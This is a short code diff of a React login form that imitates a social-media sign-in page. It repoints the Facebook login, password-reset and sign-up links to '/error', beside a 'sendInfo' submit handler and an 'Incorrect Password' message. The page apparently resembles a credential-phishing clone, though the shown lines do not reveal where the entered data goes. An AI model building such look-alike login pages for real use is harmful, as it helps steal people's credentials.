@@ -40,13 +40,13 @@ const Form = () => {
           <button type="submit" className="form-btn" onClick={sendInfo} >Log in</button>
           {error && <p style={{color: "red", fontSize:14, margin: 5}}>Incorrect Password</p>}
           <span className="has-separator">Or</span>
-          <a className="facebook-login" href="#">
+          <a className="facebook-login" href="/error">
             <i className="fab fa-facebook-square"></i> Log in with Facebook
           </a>
-          <a className="password-reset">Forgot password?</a>
+          <a className="password-reset" href="/error">Forgot password?</a>
         </form>
         <div className="sign-up">
-          Don't have an account? <a>Sign up</a>
+          Don't have an account? <a href="/error">Sign up</a>
         </div>
         <div className="get-the-app">
           <span>Get the app.</span>
